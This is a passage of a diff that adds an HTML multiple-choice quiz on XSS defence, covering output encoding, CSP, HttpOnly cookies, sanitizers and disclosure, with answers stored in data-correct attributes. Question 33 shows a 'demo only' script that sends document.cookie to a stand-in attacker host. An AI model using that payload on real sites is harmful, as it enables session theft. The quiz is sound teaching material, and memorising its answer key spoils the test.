+                    <input class="form-check-input" type="radio" name="q19" id="q19d" value="d">
+                    <label class="form-check-label" for="q19d">Metasploit</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 20 -->
+    <div class="card mcq-card mb-2" data-correct="a">
+        <div class="card-body">
+            <h5 class="card-title mb-2">20. Which HTML element can be abused with onerror to trigger XSS?</h5>
+            <p class="card-text">Pick the element commonly used.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q20" id="q20a" value="a">
+                    <label class="form-check-label" for="q20a">&lt;img&gt;</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q20" id="q20b" value="b">
+                    <label class="form-check-label" for="q20b">&lt;meta&gt;</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q20" id="q20c" value="c">
+                    <label class="form-check-label" for="q20c">&lt;link&gt;</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q20" id="q20d" value="d">
+                    <label class="form-check-label" for="q20d">&lt;html&gt;</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 21 -->
+    <div class="card mcq-card mb-2" data-correct="b">
+        <div class="card-body">
+            <h5 class="card-title mb-2">21. Which HTTP response behavior should be avoided to reduce reflected XSS?</h5>
+            <p class="card-text">Select the behavior to avoid.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q21" id="q21a" value="a">
+                    <label class="form-check-label" for="q21a">Using HTTPS</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q21" id="q21b" value="b">
+                    <label class="form-check-label" for="q21b">Reflecting raw query parameters directly into HTML</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q21" id="q21c" value="c">
+                    <label class="form-check-label" for="q21c">Setting HttpOnly cookies</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q21" id="q21d" value="d">
+                    <label class="form-check-label" for="q21d">Using CSP</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 22 -->
+    <div class="card mcq-card mb-2" data-correct="c">
+        <div class="card-body">
+            <h5 class="card-title mb-2">22. What is the role of output encoding?</h5>
+            <p class="card-text">Pick its purpose.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q22" id="q22a" value="a">
+                    <label class="form-check-label" for="q22a">Compress server responses</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q22" id="q22b" value="b">
+                    <label class="form-check-label" for="q22b">Encrypt HTML output</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q22" id="q22c" value="c">
+                    <label class="form-check-label" for="q22c">Escape characters so user input is treated as data not code</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q22" id="q22d" value="d">
+                    <label class="form-check-label" for="q22d">Replace images with placeholders</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 23 -->
+    <div class="card mcq-card mb-2" data-correct="a">
+        <div class="card-body">
+            <h5 class="card-title mb-2">23. Which of these is a defense-in-depth control for XSS?</h5>
+            <p class="card-text">Choose the best multi-layer approach.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q23" id="q23a" value="a">
+                    <label class="form-check-label" for="q23a">Input validation + output encoding + CSP</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q23" id="q23b" value="b">
+                    <label class="form-check-label" for="q23b">Only rely on WAF</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q23" id="q23c" value="c">
+                    <label class="form-check-label" for="q23c">Disable HTTPS</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q23" id="q23d" value="d">
+                    <label class="form-check-label" for="q23d">Store cleartext passwords</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 24 -->
+    <div class="card mcq-card mb-2" data-correct="b">
+        <div class="card-body">
+            <h5 class="card-title mb-2">24. Which element attribute is particularly risky when populated with user data?</h5>
+            <p class="card-text">Select the risky attribute.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q24" id="q24a" value="a">
+                    <label class="form-check-label" for="q24a">alt</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q24" id="q24b" value="b">
+                    <label class="form-check-label" for="q24b">onerror / onclick (event handlers)</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q24" id="q24c" value="c">
+                    <label class="form-check-label" for="q24c">height</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q24" id="q24d" value="d">
+                    <label class="form-check-label" for="q24d">title</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 25 -->
+    <div class="card mcq-card mb-2" data-correct="c">
+        <div class="card-body">
+            <h5 class="card-title mb-2">25. What does HttpOnly cookie flag prevent?</h5>
+            <p class="card-text">Select the prevention.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q25" id="q25a" value="a">
+                    <label class="form-check-label" for="q25a">Cookies being sent over HTTP</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q25" id="q25b" value="b">
+                    <label class="form-check-label" for="q25b">Cookies being read by other domains</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q25" id="q25c" value="c">
+                    <label class="form-check-label" for="q25c">JavaScript access to cookies (document.cookie)</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q25" id="q25d" value="d">
+                    <label class="form-check-label" for="q25d">Cookies expiring</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 26 -->
+    <div class="card mcq-card mb-2" data-correct="b">
+        <div class="card-body">
+            <h5 class="card-title mb-2">26. Which of these is an example of a reflected XSS vector?</h5>
+            <p class="card-text">Choose the reflected vector.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q26" id="q26a" value="a">
+                    <label class="form-check-label" for="q26a">Malicious script saved to a database comment</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q26" id="q26b" value="b">
+                    <label class="form-check-label" for="q26b">Script embedded in a URL parameter and echoed in response</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q26" id="q26c" value="c">
+                    <label class="form-check-label" for="q26c">Payload delivered via DNS OOB</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q26" id="q26d" value="d">
+                    <label class="form-check-label" for="q26d">Client-side template injection only</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 27 -->
+    <div class="card mcq-card mb-2" data-correct="a">
+        <div class="card-body">
+            <h5 class="card-title mb-2">27. Which response header can help prevent clickjacking (related but useful)?</h5>
+            <p class="card-text">Select the header.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q27" id="q27a" value="a">
+                    <label class="form-check-label" for="q27a">X-Frame-Options</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q27" id="q27b" value="b">
+                    <label class="form-check-label" for="q27b">Content-Type</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q27" id="q27c" value="c">
+                    <label class="form-check-label" for="q27c">Cache-Control</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q27" id="q27d" value="d">
+                    <label class="form-check-label" for="q27d">Server</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 28 -->
+    <div class="card mcq-card mb-2" data-correct="d">
+        <div class="card-body">
+            <h5 class="card-title mb-2">28. Which of the following is a sign of a DOM XSS vulnerability?</h5>
+            <p class="card-text">Choose the indicative sign.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q28" id="q28a" value="a">
+                    <label class="form-check-label" for="q28a">Presence of SQL errors</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q28" id="q28b" value="b">
+                    <label class="form-check-label" for="q28b">TLS handshake failures</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q28" id="q28c" value="c">
+                    <label class="form-check-label" for="q28c">Server side 500 errors only</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q28" id="q28d" value="d">
+                    <label class="form-check-label" for="q28d">Client-side DOM changes when altering location.hash</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 29 -->
+    <div class="card mcq-card mb-2" data-correct="c">
+        <div class="card-body">
+            <h5 class="card-title mb-2">29. Which of the following should you avoid to reduce XSS risk?</h5>
+            <p class="card-text">Pick the bad practice.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q29" id="q29a" value="a">
+                    <label class="form-check-label" for="q29a">Sanitizing user-supplied HTML</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q29" id="q29b" value="b">
+                    <label class="form-check-label" for="q29b">Using template engines with auto-escape</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q29" id="q29c" value="c">
+                    <label class="form-check-label" for="q29c">Inserting untrusted data directly with innerHTML</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q29" id="q29d" value="d">
+                    <label class="form-check-label" for="q29d">Setting HttpOnly cookies</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 30 -->
+    <div class="card mcq-card mb-2" data-correct="b">
+        <div class="card-body">
+            <h5 class="card-title mb-2">30. Which method can detect XSS during development (static)?</h5>
+            <p class="card-text">Choose the best static method.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q30" id="q30a" value="a">
+                    <label class="form-check-label" for="q30a">Network scanning</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q30" id="q30b" value="b">
+                    <label class="form-check-label" for="q30b">Static Application Security Testing (SAST)</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q30" id="q30c" value="c">
+                    <label class="form-check-label" for="q30c">Port scanning</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q30" id="q30d" value="d">
+                    <label class="form-check-label" for="q30d">DNS brute force</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 31 -->
+    <div class="card mcq-card mb-2" data-correct="a">
+        <div class="card-body">
+            <h5 class="card-title mb-2">31. What is a safe way to include user-provided URLs in a page?</h5>
+            <p class="card-text">Choose the safest method.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q31" id="q31a" value="a">
+                    <label class="form-check-label" for="q31a">Validate the URL and set it as href via setAttribute</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q31" id="q31b" value="b">
+                    <label class="form-check-label" for="q31b">Concatenate it into innerHTML</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q31" id="q31c" value="c">
+                    <label class="form-check-label" for="q31c">Store in localStorage without checks</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q31" id="q31d" value="d">
+                    <label class="form-check-label" for="q31d">Use eval() to parse URL</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 32 -->
+    <div class="card mcq-card mb-2" data-correct="c">
+        <div class="card-body">
+            <h5 class="card-title mb-2">32. When is using a whitelist sanitizer preferred over a blacklist?</h5>
+            <p class="card-text">Pick the reason.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q32" id="q32a" value="a">
+                    <label class="form-check-label" for="q32a">Whitelist is faster than blacklist</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q32" id="q32b" value="b">
+                    <label class="form-check-label" for="q32b">Blacklist is mandatory</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q32" id="q32c" value="c">
+                    <label class="form-check-label" for="q32c">Whitelist reduces risk by allowing only known-safe tags/attributes</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q32" id="q32d" value="d">
+                    <label class="form-check-label" for="q32d">Whitelist disables all images</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 33 -->
+    <div class="card mcq-card mb-2" data-correct="b">
+        <div class="card-body">
+            <h5 class="card-title mb-2">33. What is a common payload to exfiltrate cookies (demo only)?</h5>
+            <p class="card-text">Choose the illustrative payload.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q33" id="q33a" value="a">
+                    <label class="form-check-label" for="q33a">&lt;div&gt;document.cookie&lt;/div&gt;</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q33" id="q33b" value="b">
+                    <label class="form-check-label" for="q33b">&lt;script&gt;new Image().src='https://attacker/?c='+document.cookie&lt;/script&gt;</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q33" id="q33c" value="c">
+                    <label class="form-check-label" for="q33c">&lt;script&gt;alert(window.location)&lt;/script&gt;</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q33" id="q33d" value="d">
+                    <label class="form-check-label" for="q33d">&lt;img src='/' alt='x'&gt;</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 34 -->
+    <div class="card mcq-card mb-2" data-correct="d">
+        <div class="card-body">
+            <h5 class="card-title mb-2">34. Which approach helps detect DOM XSS during runtime?</h5>
+            <p class="card-text">Pick the runtime detection method.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q34" id="q34a" value="a">
+                    <label class="form-check-label" for="q34a">SAST only</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q34" id="q34b" value="b">
+                    <label class="form-check-label" for="q34b">Port scanning</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q34" id="q34c" value="c">
+                    <label class="form-check-label" for="q34c">Network IDS only</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q34" id="q34d" value="d">
+                    <label class="form-check-label" for="q34d">RASP or browser instrumentation to monitor DOM sinks</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 35 -->
+    <div class="card mcq-card mb-2" data-correct="a">
+        <div class="card-body">
+            <h5 class="card-title mb-2">35. Why are single-page applications (SPAs) at risk for DOM XSS?</h5>
+            <p class="card-text">Choose the correct reason.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q35" id="q35a" value="a">
+                    <label class="form-check-label" for="q35a">They rely heavily on client-side JS that may write untrusted data to the DOM</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q35" id="q35b" value="b">
+                    <label class="form-check-label" for="q35b">They do not use HTTPS</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q35" id="q35c" value="c">
+                    <label class="form-check-label" for="q35c">SPAs always use eval()</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q35" id="q35d" value="d">
+                    <label class="form-check-label" for="q35d">SPAs do not support cookies</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 36 -->
+    <div class="card mcq-card mb-2" data-correct="b">
+        <div class="card-body">
+            <h5 class="card-title mb-2">36. Which principle reduces XSS impact by limiting privileges?</h5>
+            <p class="card-text">Select the security principle.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q36" id="q36a" value="a">
+                    <label class="form-check-label" for="q36a">Fail open</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q36" id="q36b" value="b">
+                    <label class="form-check-label" for="q36b">Least privilege</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q36" id="q36c" value="c">
+                    <label class="form-check-label" for="q36c">Security through obscurity</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q36" id="q36d" value="d">
+                    <label class="form-check-label" for="q36d">Open permissions</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 37 -->
+    <div class="card mcq-card mb-2" data-correct="d">
+        <div class="card-body">
+            <h5 class="card-title mb-2">37. What should developers avoid to reduce XSS risks in attributes?</h5>
+            <p class="card-text">Pick the unsafe practice.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q37" id="q37a" value="a">
+                    <label class="form-check-label" for="q37a">Using setAttribute for href after validation</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q37" id="q37b" value="b">
+                    <label class="form-check-label" for="q37b">Encoding attribute values</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q37" id="q37c" value="c">
+                    <label class="form-check-label" for="q37c">Applying URL validation</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q37" id="q37d" value="d">
+                    <label class="form-check-label" for="q37d">Concatenating user input into attribute strings without encoding</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 38 -->
+    <div class="card mcq-card mb-2" data-correct="c">
+        <div class="card-body">
+            <h5 class="card-title mb-2">38. Which testing technique is useful for finding reflected XSS quickly?</h5>
+            <p class="card-text">Choose the technique.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q38" id="q38a" value="a">
+                    <label class="form-check-label" for="q38a">Static analysis only</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q38" id="q38b" value="b">
+                    <label class="form-check-label" for="q38b">Firewall rules</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q38" id="q38c" value="c">
+                    <label class="form-check-label" for="q38c">Injecting payloads into parameters and observing response</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q38" id="q38d" value="d">
+                    <label class="form-check-label" for="q38d">Port scanning</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 39 -->
+    <div class="card mcq-card mb-2" data-correct="a">
+        <div class="card-body">
+            <h5 class="card-title mb-2">39. What's a safe pattern for rendering user-provided text in templates?</h5>
+            <p class="card-text">Choose the safe pattern.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q39" id="q39a" value="a">
+                    <label class="form-check-label" for="q39a">Auto-escape variables and encode for the output context</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q39" id="q39b" value="b">
+                    <label class="form-check-label" for="q39b">Render raw HTML by default</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q39" id="q39c" value="c">
+                    <label class="form-check-label" for="q39c">Use eval() to format strings</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q39" id="q39d" value="d">
+                    <label class="form-check-label" for="q39d">Store HTML in GET params</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 40 -->
+    <div class="card mcq-card mb-2" data-correct="b">
+        <div class="card-body">
+            <h5 class="card-title mb-2">40. Which of these is a client-side XSS sink?</h5>
+            <p class="card-text">Pick the correct sink.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q40" id="q40a" value="a">
+                    <label class="form-check-label" for="q40a">Database stored procedures</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q40" id="q40b" value="b">
+                    <label class="form-check-label" for="q40b">innerHTML / document.write / eval</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q40" id="q40c" value="c">
+                    <label class="form-check-label" for="q40c">TLS configuration</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q40" id="q40d" value="d">
+                    <label class="form-check-label" for="q40d">Server-side templates only</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 41 -->
+    <div class="card mcq-card mb-2" data-correct="d">
+        <div class="card-body">
+            <h5 class="card-title mb-2">41. What is "sanitization" in XSS defense?</h5>
+            <p class="card-text">Choose the best definition.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q41" id="q41a" value="a">
+                    <label class="form-check-label" for="q41a">Encrypting user input</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q41" id="q41b" value="b">
+                    <label class="form-check-label" for="q41b">Storing input in cookies</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q41" id="q41c" value="c">
+                    <label class="form-check-label" for="q41c">Disabling JavaScript</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q41" id="q41d" value="d">
+                    <label class="form-check-label" for="q41d">Cleaning and transforming input to remove or neutralize dangerous content</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 42 -->
+    <div class="card mcq-card mb-2" data-correct="a">
+        <div class="card-body">
+            <h5 class="card-title mb-2">42. What is the main advantage of using framework templating?</h5>
+            <p class="card-text">Select the primary advantage.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q42" id="q42a" value="a">
+                    <label class="form-check-label" for="q42a">Auto-escaping of output reduces XSS risk</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q42" id="q42b" value="b">
+                    <label class="form-check-label" for="q42b">It makes pages load faster always</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q42" id="q42c" value="c">
+                    <label class="form-check-label" for="q42c">It removes the need for HTTPS</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q42" id="q42d" value="d">
+                    <label class="form-check-label" for="q42d">It disables cookies</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 43 -->
+    <div class="card mcq-card mb-2" data-correct="b">
+        <div class="card-body">
+            <h5 class="card-title mb-2">43. During responsible disclosure you should:</h5>
+            <p class="card-text">Pick the best action.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q43" id="q43a" value="a">
+                    <label class="form-check-label" for="q43a">Publicly exploit the issue immediately</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q43" id="q43b" value="b">
+                    <label class="form-check-label" for="q43b">Privately notify the owner with reproduction steps and remediation</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q43" id="q43c" value="c">
+                    <label class="form-check-label" for="q43c">Sell the vulnerability</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q43" id="q43d" value="d">
+                    <label class="form-check-label" for="q43d">Ignore it</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 44 -->
+    <div class="card mcq-card mb-2" data-correct="c">
+        <div class="card-body">
+            <h5 class="card-title mb-2">44. What does DOMPurify do?</h5>
+            <p class="card-text">Choose the correct function.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q44" id="q44a" value="a">
+                    <label class="form-check-label" for="q44a">Minifies JavaScript</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q44" id="q44b" value="b">
+                    <label class="form-check-label" for="q44b">Scans network traffic</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q44" id="q44c" value="c">
+                    <label class="form-check-label" for="q44c">Sanitizes HTML to remove dangerous tags/attributes</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q44" id="q44d" value="d">
+                    <label class="form-check-label" for="q44d">Generates CSP headers</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 45 -->
+    <div class="card mcq-card mb-2" data-correct="a">
+        <div class="card-body">
+            <h5 class="card-title mb-2">45. Which of these makes inline event handlers (onclick) safer?</h5>
+            <p class="card-text">Pick the best practice.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q45" id="q45a" value="a">
+                    <label class="form-check-label" for="q45a">Avoid inline handlers; attach listeners in JS after validating input</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q45" id="q45b" value="b">
+                    <label class="form-check-label" for="q45b">Use more inline handlers</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q45" id="q45c" value="c">
+                    <label class="form-check-label" for="q45c">Use eval inside handlers</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q45" id="q45d" value="d">
+                    <label class="form-check-label" for="q45d">Store handlers in cookies</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 46 -->
+    <div class="card mcq-card mb-2" data-correct="b">
+        <div class="card-body">
+            <h5 class="card-title mb-2">46. For a public blog comments feature, which is ideal?</h5>
+            <p class="card-text">Choose the comment-handling strategy.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q46" id="q46a" value="a">
+                    <label class="form-check-label" for="q46a">Render raw user HTML</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q46" id="q46b" value="b">
+                    <label class="form-check-label" for="q46b">Sanitize and escape user-supplied content before rendering</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q46" id="q46c" value="c">
+                    <label class="form-check-label" for="q46c">Allow users to save scripts</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q46" id="q46d" value="d">
+                    <label class="form-check-label" for="q46d">Use document.write for comments</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 47 -->
+    <div class="card mcq-card mb-2" data-correct="c">
+        <div class="card-body">
+            <h5 class="card-title mb-2">47. Which of the following is an XSS detection technique in the browser?</h5>
+            <p class="card-text">Select the browser-side technique.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q47" id="q47a" value="a">
+                    <label class="form-check-label" for="q47a">TCP packet inspection</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q47" id="q47b" value="b">
+                    <label class="form-check-label" for="q47b">Static code analysis of server code</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q47" id="q47c" value="c">
+                    <label class="form-check-label" for="q47c">Using DOM instrumentation to monitor dangerous sinks and sources</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q47" id="q47d" value="d">
+                    <label class="form-check-label" for="q47d">SMTP scanning</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 48 -->
+    <div class="card mcq-card mb-2" data-correct="a">
+        <div class="card-body">
+            <h5 class="card-title mb-2">48. What should you include in security reviews to catch XSS?</h5>
+            <p class="card-text">Pick the best inclusion.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q48" id="q48a" value="a">
+                    <label class="form-check-label" for="q48a">Review of all sinks (innerHTML, eval, document.write) and input sources</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q48" id="q48b" value="b">
+                    <label class="form-check-label" for="q48b">Only network firewall rules</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q48" id="q48c" value="c">
+                    <label class="form-check-label" for="q48c">Ignoring client-side code</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q48" id="q48d" value="d">
+                    <label class="form-check-label" for="q48d">Disabling logging</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 49 -->
+    <div class="card mcq-card mb-2" data-correct="b">
+        <div class="card-body">
+            <h5 class="card-title mb-2">49. Which scenario is an example of second-order XSS?</h5>
+            <p class="card-text">Choose the second-order example.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q49" id="q49a" value="a">
+                    <label class="form-check-label" for="q49a">Immediate reflection of input in response</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q49" id="q49b" value="b">
+                    <label class="form-check-label" for="q49b">User-supplied data stored safely then later used in a different unsafe context causing script execution</label>
